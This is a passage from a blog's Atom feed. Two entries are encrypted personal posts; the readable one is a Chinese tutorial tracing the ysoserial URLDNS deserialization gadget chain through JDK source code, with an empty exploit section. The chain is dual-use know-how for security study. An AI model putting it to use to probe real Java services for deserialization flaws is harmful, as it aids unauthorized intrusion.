1c6921fdea2fd4d5a3761b68d9789173ffd51883fb84c667484b6166c0f10d9243bae590549140a3e1f19c08d762366d13ae875010ef9e46dfed01ca73e21c5fc23ff8edf2d9d6846316558e56318228e206d3f1114934f7c3d6fd176be0f1b12b44a2b5e27b076a95fc61f0f6e4eb844cfc020ecd965a86a7f8c4a8b06476c104136369d4ea0ec4445ab1ff6e9897eb89860b1e5dce543d25fa915048f66179d0541fe1eb8d5ab66304181cc32fd1b7e0c90f9299ff1807dc7207705fcbe3018219a5d3dd2990daf390af8001f9ff2bc74a0acd7c489f516334e6f6af79381bd09dd48ebb967417749e1f8fc4aa0bb842681db2efd1e89b42baf3d211de5793465d845ecd9db4f79eff545fea20f2aacca6e440923560dd4f89f9a0357403b9accb6c94346b6319734c08e432a5b1320244c607d16d6209b964b515c47c3a473360156511af8bab7507d98725c787c13656825e716cdf464f5e5141c237e6f389ab032ff2eadc983d68608de3c9a31aa8653c093c84bfdb3bd6192036759e6fe8fa93b05e43d2f199b46f7bd53473016c3df1db9de449c45072a48097784de73a2c75545513c5516f0ce73fc86f2805fcdef9e42aba259c3b4d909a6691f952bf0cc7d1c0788dd1ac613a70fd297cc2703c31b90cb8bbc144bfd29a1d0bcd74f25d6bf74e19dd6e6b8b4c1846f9e37c0e4cf00748be59ad0db7952a566ae084a2eb461ddcc0bc3d30a8b118dfda5635e31972a6006e08513e3e2a519a2803d26e92c18adc666bdd791b80e6d06afaf20fefa01a5bcb672463e67f1c6d406aaccee1901e78bf270c1fc543373a1bdd7c05723b702cad0e1c08451eb94b47d7fb065cf7df0048f8ec7c6462e5c73750782f430b85b6bf6ae908483bf9d29c176952696854c9c5ae7bc65ff17959e782b09fa3844d097ef31568cebdcb7c394e182c45418dca9aad422d61ed18cea88bfc157dac30b8762ab7ec2aa846d97fc6725fddc44b705c159523a65c58fdf932f887c028324840ebab8d54845d9c8515a54ecc5d9ab18a4122de93565a195907210b9963277fe818b2a02f6876663a817fa4319edefd0739f48e5cbc7e5d16837d10c0ae259076dd3fa2cb93a1cac07e4b67837e3e8b08d2346ce3971bf870fd4f6fb33a8d272a74fffe993279adaace8bf8a1d6cc02d1b40cb33f7bcfc3b5bcc8ef52040a69341e80736ffe0552e6236d5f57228acab3a03cea7ab44e969e98ae572bb645371c4d4f6e79fe0ad5f1b2e58c495303d205f73c748e9a32e960276cbed74431d6de7683570467ec37e8962ddae9b5007cb706a5c16acff4f0e123b76d57fbeb0ca0ee0be36a8159cbe33740ad4ac83da4e1c960a7cafd332ff679441e22b29cf4ecc6d3c71418152061a52f0e70fadd753e3acd3c7983a07d88c489bf913a5673c2b70dde1b0308ae70206a8f2a5d24af7ebb98bc940ba4794e2fd652067d33697d82de4c15018d82defb9699e5d1b82ffb8f098a8b4a7cb1977b380fe48eb2e6e17a458ce7b30f790150e4cd29e130f6a3b03a2a3668ce2e076e0b2a1be5ee3074a00a2a2cbe8e03ec899f29f35c4cc934b2b22770511889c93b0af92e9ef4939c73f861561c39de8a6db7717dd480b190d1dec540434fc8fa8ae7231294df65ba72dc2413740d05a66ee4a04c9214a18b26e52d277f4dd2ea1b5727dc87e96e95a9a6632724499559b77b7c082e249c5610a89d551e24434fba9f0f5fe681a03c07d2ad3b96a3184066602f3b7af3e8a63b7092b3a2f0bd6d5eee3e67b6bad1dd16156bfbced1ee6c7542317d812a6f2a5e1e41e3e6949a57d33eed273e91e7c87f3d607be50730e9b35a364033d64a8f14f6bf9cc4a5cd3144835a0a01b320a91d898875cbcbbe00cada35d92dc3999768df744a63538e955be79396d9936d69970b06cf91e3a85802db34bd87ddf0540f4312c6edcb16e78f544861b378caaf4e19812ac572348b420f845c57bba31002377ee2826fdc1547ed22752933a364991546445a554e761ae9e3670cf64bdedf730ed6a537b2424809e1bfe2c615f4bd6e7246b002a976ece0e1c46530ac236d0e20b808dc3da085b2ea884e687d4b98a31469a6322badb68eb8cc797125aa2761537e57a74fee53c21b8b435067cd02a07bab8a4e6d80c39bb0c64b1b79b06bad0d4d3cd803922b10fae1b2219de4cadfece4c2514a25827c555b5ec6d9b2bb3b741f0dfc1c4678e8d60b04dcdfb7b19a214404d105c86672b916800f06271eaeeefec90f3d52e5e3b87aa014821bf8678324bce797de6f586a639998df5ed24d50fd1ac1f7b329fb39f56f3b9ca5f3f60c08fe5b1be90eafbb01ad3e96981cd847937fff65fc793e4bda22d893c47a575d501f22bf74099a0bd06f670124715bbcf73255b5d2072b6042736a80cda539d14e0beb53ce4920017f83b9376dc3cdc007b9752c395e0329f9bd977d50de97cc5b18d63d7e054489ee0c2a9afa2fd18b24696cbb4843968a823f72462f6583d6c7d0e81d0e4e56fb5ef889a8709ddddaf29a1a774191c5912ed7793b75065e225a27785a976ba79c98388b4cc757810ab6aefb33a520e36cda3b74ad003149ca2609fe1cc016ad224ece5e12019dd9c9f0bb5ad9ae8c3167f4162a20ebf7acd0482ce3190cf8181d38c310dd486c3c8a41cd664dff84db65847cdd2ba1a86c34c7428e49c7967f04a2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>java_URL链分析</title>
    <link href="https://ghostasky.github.io/2022/07/22/Javasec-URL/"/>
    <id>https://ghostasky.github.io/2022/07/22/Javasec-URL/</id>
    <published>2022-07-21T16:00:00.000Z</published>
    <updated>2022-07-23T11:15:34.440Z</updated>
    
    <content type="html"><![CDATA[<p>java安全的东西在github仓库里写了一点，正好放假了，在博客里再重新写一遍，，感觉忘的差不多了。</p><p>[toc]</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><blockquote><p>  <code>URLDNS</code>为<code>ysoserial</code>的一个利用链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p></blockquote><p>整个URLDNS的链，首先反序列化出发readObject()：</p><ol><li><code>HashMap-&gt;readObject()</code></li><li><code>HashMap-&gt;hash(kay)</code></li><li><code>URL-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;getHostAddress()</code></li><li><code>InetAddress-&gt;getByName(host)</code></li></ol><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><code>ysoserial</code>执行时会调用某个类的<code>getObject</code>方法：</p><p><img src="/2022/07/22/Javasec-URL/image-20220722133055369.png"></p><p>看下<code>Hashmap</code>的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reconstitute the &#123;<span class="doctag">@code</span> HashMap&#125; instance from a stream (i.e.,</span></span><br><span class="line"><span class="comment"> * deserialize it).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最后<code>putVal</code>的时候计算了<code>key</code>的hash值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>hashCode()</code>方法，其中key为<code>URL</code>对象，调用的是<code>java.net.URL</code>中的<code>hashcode</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>handler</code>是<code>URLStreamHandler</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URLStreamHandler for this URL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure><p>继续跟<code>URLStreamHandler</code>的<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    String file = u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用了<code>getHostAddress()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的getByName为根据主机名查找IP，就是一次DNS查询，后面的就没必要跟了。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;java安全的东西在github仓库里写了一点，正好放假了，在博客里再重新写一遍，，感觉忘的差不多了。&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Java" scheme="https://ghostasky.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>关于读研or就业，还有理想</title>
    <link href="https://ghostasky.github.io/2022/07/12/2022-7-12/"/>
    <id>https://ghostasky.github.io/2022/07/12/2022-7-12/</id>
    <published>2022-07-11T16:00:00.000Z</published>
    <updated>2022-07-12T08:44:38.283Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a6379063659944aec81dd60a2c0b365a30eb6b5a737cb18e58b4fc32f2a6abaa">f045e053d6254bea7b0b1b710a9b6ff6165992db4cb1ab57008c3dfef6d7704fd4d5d053485ab0d4ec1cc06a19398d5d2de9fcb5cdacc4e5a0402d94b4f29b0fe645b1572b2410e68717f043c4b82d0b489cedfb1d0c55d0100da84211418a589eaace5c453e4e2b2312ca481bac3c479e6c45ecdf68a49b440030ddb1102d0f6625c2f32eccc94ff32fb5c974a3f8ee004566b5db3e91da8f4d9f85819f7969fda9a230e27391ee8ec44ed29d0b0bff0c1a94199a45870eca87c37a70617ba3b14d4ceb7f889b20a08a4254023ec028235967c47ce09f357d8c8fd9c0f0f7a4bf14600fc76039af23ae84a2ae696c2a66f6e89ae283f449891a577b3f2dc8ea77f859d0eb389c8ccf4fa0de9e0a4be497ca50d4bc1ddd50dc62ca221a0a19de83b0cde07165bf95a2e4ab6974008840892f2361d46a67ed996954debeb4fd7920262f67af567a9e9f0489ba1cc789787170a2ed39412416deb5a89b182ae90c96c65559992305ad14b9f10a2b0ca9375b57d55f5960ec8ec5b560fffb6ec45dcece5f9416bc984f05489378138374eb419eaf13a5416e65182cd5781d79098124a3da3347ab3295ee9d7655762851766d82aaa6172f31e4c3641eaa424ac539283e78021ca6993f83115a04a357d75c87a2ddf513366fec1a7f659aa7d8bd622526c7548137cbedf76b6b379928a0baaf39c1c0ece075b0f3d8d7d086c8162d181cbb2e19c1f7907ad439f9398fb7259ac34543a687dcfaa878ba445187e9eed7801ee719f38b8733455d09aa05d02b8067238848328d491b0b7347a177dcde6f7a133034f6a259d32640b1991c1489ef81b3e15b4d94d5bc782fc31f0242817e2be8f17be29aa967203474520279a0e86d748baec6f358b66a6a40a706a95f4addf0d10bcb96b7ef5be52800eed181ef3b4ce92e7b2a92995672a9da92bbf3ac466f86a6520f8c2490e1acca15451c1561596309eaea3cff7b2e83f411b51ddcfa63990be3092e2e931a0466c8dce685373b46218ebd5584632939ae7a2414e93774bfa223a2c1592e1fbb531f8d5766c693fed370c77a56970ba8ee06357c88b0cde047bf3488bd04106f79de5fc6a2705b4588f436dcd2a52311589f52291c5a1411dc8230411da0a296428a286aafc32e7ca9058bd99bfb8db90084a044140cb41974bfd6b0df4951c348d7a816ab2ed13780a3a04a5d2f9acc8e5bea018d0bd2d6e761edff62f24175d37e9e891f78ed900136f310ec2ad2eefc5c1646fcf4ea1845fe3790a7b847210e8f2322670b8bdb839691cee8a455671dbf7dc879a15a0769617a4b8542c5a4ce263d840b1347c2d5df59e17627f5fd471f5493fa205610ead4998521218aa012c56893bef5d2a89c25dd0ea9258eaf1784d20e6221652ab328ed2595a9b733ce3bc3312a7d1a6a7d19f964782023082aad7a5d269987e17d61733a88eb102652d05e77b6cf30b1e5acba2958a1ccd0b4bb2b78912065759834dd77839fcdc8a9e0d0eef802b7c30b4bae40f79f409135f9ade4a14f59d0d72914eaacbbde9d133e1d88d4427252a5779c2dbad8ee6de7eafa091be8d701eb271b18d35b04619f38ec7b33645cbd8dd14b36b08f3f469476b82fdb10869c0560719a2879a574496223086313ec293463fa0edde56a91106868a6b79f68e4c47c7470c82068c4e3ce3d605668e9cf5156d9331cc7566a03eab447210984c7f6907a8fad4a395cacbec9fe7274545ea2462e315447cca9149c277f5cb0094d77381ec5fba2f99bce3d23644ce5eb02ab13a233613b7a6612a9289d2622d421be72a3a5eed1f86761201de6cf4c3e57bb4e6729480145edf05932cdbf15b2411ec69856657529a76fa46e62082aa67d90ea3b2ba1a33c628b8f0a719df040399ebbcee3bc13fe021fa645d281e03fe56593c4e1bb2ad86dadbca90f91fd9436966abaa81149dade65d9b0a0f80270e518af8045bf0fafc177b7b41d40e30dbc5396030f35a0f78386b66bf3793d1c5f98c5aaa15e57488ce412732830e80b2b0428a54df022aa14408aabde84e4ff9ee3a79c112e3ec27a4b63bdf3e377e07d26b09fa8e001593cc2828f315500bdb1a7157f01d46a107dd6bb03d75ee1c3cc98984db7d9ba5b558cc8638d1df95466485d2b6269d8dabd84e9c9f7728e023d57e319bd70611a9a413ec782251b32d0931061ba065823087ea648acc434b046fa9a15eb46a7752eadbec1cb063004993103b6650f5031e08c36131cf04745f73f93916e187d881dbf42e21799c722bc6e58e23bd758cc3b8948d78c98e06b2b3d159afb82da8b03239875ec34179ed5a589aedc7589f2df59eb71ae3b5bce8bed2a6dec0e62c571fdf9dd7604b6ecfa61e2771d66e6781f9c84c7fe0ebd88577f47482cc0cbfd0751276593620e44cde0dcc34f0c240f183f556f5a69d6f96e428f59cf569a01754e71cc9e055a557136c321860033ffe5a2eedfb698c778dfb4842770f606351871ca47e34f0fab12fa462754ea27c2d8201e09cca506c7ce4729e0833cc57c5d598b4df930f70a2d5677bb72a81404ea727db4edb16f72de19fbc2d10d20bf41a20ea111a7c825b9daedeed4e126957602432128dbeb7d69eedad6ae67929bc3d18dd83842bfefb36055494db6ded126e67f11c58b33281d6fe901edb019ec87b1a6a719edb677d95efaa12139258163bf76175ef9d637719fa92470bb93f4e004dd4648dc6391bb029fdfaf22a2b2eb4a69c649a923bc061449fa0857c5b0349dc10e9238ff5fce8909e256e98e7d0cc1d8c1f2cf054f9fe1d6d9cdfb80d2c19288394269054017eac7e61d2f454435762523255bc31d9558e62082fbe9b198548a208e1f81fb1944d4059e08dba0d320b9fe1a901964b445121b91002bae377e32d69b9f770a3c00e7711fb4f5402554892d99ce97fdcba0232203efe7adb678b24751c37b16f0e9b9faced3919b9cf34d21fbbe38477dd0bedd0817c00310849923d0e6c25bd1eb8bdc622df9e9cb714f79b5cba1f38723ca70f62f2560480a8231fa1fdefee09ad51b81807dae27aa6c687c6abcf46561ef996050159af497295c13efd03cd8509d530aa1fe817e3cdd406f8aedd03c41158923bea5cb0dda6cf3ddd455c1a5643edc6dfd42c5be8929c6843362e72f591c387e234dddf51d762b20899b7d7fd7564ca995375cf7548f4fdd228082e856493c98c5bc02b2e9497121e332f5314d90ff4f826d8cad4577e6b08f64c4c1bac059230020522b4e561e0dfe34079d5c8732362d31055d74752463ee179267ebc3a9d3cf57640f833570074bdbc2dfaef0351286feef23a2d93d843b6cf1fcaf69c2fc34baaf8568b3022ea770d04633345a6846fb429909666bfadfd352e65f6afc69af149fce090a0c35a4ea74cabfceaa2f81eb89a0716b85f70880c67c0a9158ee2ab26d33294dc73ac524a9643cbc2200a7be2cca863fcc2c48e69191e3b1ba6df4fef5e54f33449f3e6b0ea6d2c90832373c91940aea6bf5db93d204a53803b29b1ed3af08b41a6a9c0a345b6c2338adfce8a342c089ba27961d29be268e0a144fd98baac3cb842bfbfa296426da498cd2ecbc90dbda7f8606eea6bedbac80bf20ececd2172d68024767694b7a73f34980d674b07023aeb21cfa407f355e237bf8cb63c1d533e4cb15414ac6367ae523c67b189b3a8d7d26d648e08febc3cda064ce74e7b4248ded011077ca4e165ee58d74a10b670d922c05004fb5d4af2347efb3d84d012c1fba66c6afdbca6c5fccea0a220138b3f952972c18f5b34994fa2ef689d4ee39152f07e354343eefd4f17790271fa97337bfba99ff304f27452923c9f3d0521d0800bee03c207c458cc04b0c48e7061b42a85d365fa0ab78aceec492df7b2ae5bbb7a180052292301bb4f29a8361098c5b67ca69248b16798821669de7cf69065238faef4f4423b6040c74082caf2ff944962a2eab063a0e3efe9374edd02ea383de56fbcde488176c1ec334b121098dea4b30972e9d5fbb57a9f7b9a0fb58069f8492186a0910e4f41df9b439bea2af534c0e823e4a527c7888a6c18ec99b190f7f1c5014a4a80c5f69f1e500728e95488b90e3414dad751f6dd6b88075875ee0bfe0139aff7856be9cc910628fdec6549c34681c783a0566feb213c1f05f5c2ee5c22f5744eeb4d13cc688785bab7f20b3c91c3fe7e1cfb3b305e55515ca4f0ed33f3f262ec795015d62fff29a5491df1909bf153e8b2aaeea90d8e18b282c16b664641faa277c4a05a6b604f290990ba55d58543b2155f86fa4f6a6c8559a8d896d61addca53801a7fbc5b3c0e7f6f6a859aababd54fdbdf2ecf01f52b10dfe3d6ea077a4e3683a8a17c61298151460be8e59fe402cdabc2574363a5662429699d6afbca8d676e6e6514e91c1553c35148ab54999eeb688babc7070cd908b7b64add1e19f02771148691efcfdc224c18c35cb0a58544d6494d7ef53a7fb469fb24c7e79f3d21938416e2e34c95e3031f510979668a68fd5b3e16f415461e139f398a1dd54c0d0bbe5867885420fc689418b6de3266cede8af522cbd8fe55f47278aa328d0e7f1c7f378ef1a9b80cdecb88ddcc44b352271a5571aa7c3ad15afdbc57f55d84eb2f9614d2ef3a8674c93401f1ea3421326664a803c4306e6d0591c62753c16cd0382ab090e35a94b4f12dadae52ed50d7eda17ba8a941e96c01eab699732827fba1c9be7b85ea97019e99a1078a99e746e7c49c5dad519fa1d77972f869e5367964b91558549fb72687dd00051cac907bbf11e16e45a6526354dccdb5c8741259ce397c1acbe4a652d253af1c7e9cd3a5cff6c225070c125a9287667d2a5058b955bf94cd442718b8296adab186b51ab02564a2b8fb940fa0979789c17431de3c9d13a1e01553ae331376be88fd40730f532c2218b044f7e8e2f7f0f61df006107d9545c30b87f4d37f8079e5a372b29d2d7ea00484ccc8b974fc2f841a1f527c887590c96c79ec16f63d40628930b300cf8bcfcfa3acd8aa928661dc46e82698803600690946871056284c1fc9cde329a58467b4abff394659965ff133e5bc411b8dea4e3d2eff6a245ebd16ff63bcbc50faf78bb06fcf9bfcdce60c1d08d36a7f5e73e227d2c2613acb6dba104e93bd29fa13086cf9a1bedc7590cae02cb4b1213417a7f2f1377515ec041dd2453983164c655831c04505e7094f94c30252dda1bed218e6066dab077a21645cfb24f25208aae3cb86fe6824628bcc06f719978f9b1f19d8bef22e771292c4e87119fb70f54a3f81078ccef0480a8472ce90928644dd4822799e